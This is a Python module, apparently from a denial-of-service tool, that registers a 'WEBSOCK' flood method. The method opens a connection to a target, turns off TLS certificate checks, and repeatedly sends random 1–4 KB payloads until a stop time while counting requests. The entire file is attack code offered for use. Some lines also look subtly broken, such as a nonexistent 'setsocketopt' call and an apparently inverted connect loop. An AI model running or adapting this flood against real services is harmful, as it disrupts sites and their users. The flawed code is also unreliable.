'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, requests, asyncio, ssl
from websocket import create_connection
from urllib.parse import urlparse
from src.core import Core
from src.utils import *
from src.useragent import *

def on_error(a,b): return
def on_close(a,b,c): return

async def flood(attack_id, url, stoptime) -> None:

    address = urlparse(url).netloc.split(':')

    host = address[0]
    if len(address) == 1:
        port = 80
    else:
        port = address[1]

    wsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wsock.setsocketopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    wsock.settimeout(3)
    
    while Core.killattack:
        try: wsock.connect( (host, int(port)) ); break
        except: pass

        time.sleep(0.1)

    if port == 443:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        mainws = create_connection(f'wss://{host}:{str(port)}', socket=wsock, on_error=on_error, on_close=on_close, timeout=5, ssl=ctx)
    else:
        mainws = create_connection(f'ws://{host}:{str(port)}', socket=wsock, on_error=on_error, on_close=on_close, timeout=5)

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:
            mainws.send(utils().randstr(randint(1024, 4096)))

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

def wrapper(attack_id, url, stoptime) -> None:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(flood(attack_id, url, stoptime))

Core.methods.update({
    'WEBSOCK': {
        'info': 'Websocket flood, supports SSL (wss://)',
        'func': wrapper
    }
})